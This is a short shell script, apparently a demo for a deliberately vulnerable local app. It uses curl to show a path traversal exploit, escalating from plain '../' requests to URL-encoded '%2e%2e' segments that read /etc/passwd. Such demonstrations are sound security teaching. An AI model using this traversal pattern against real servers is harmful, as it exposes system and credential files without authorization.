if [ -z "$GOOF_HOST" ]; then
	export GOOF_HOST=http://localhost:3001
fi

# Simple static file access
curl "$GOOF_HOST/public/about.html"

# Directory listing (not necessary)
curl "$GOOF_HOST/public/"

# Failed ../
curl "$GOOF_HOST/public/../../../"

# Exploit start
curl "$GOOF_HOST/public/%2e%2e/%2e%2e/%2e%2e/"

# Exploit full
curl "$GOOF_HOST/public/%2e%2e/%2e%2e/%2E%2E/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
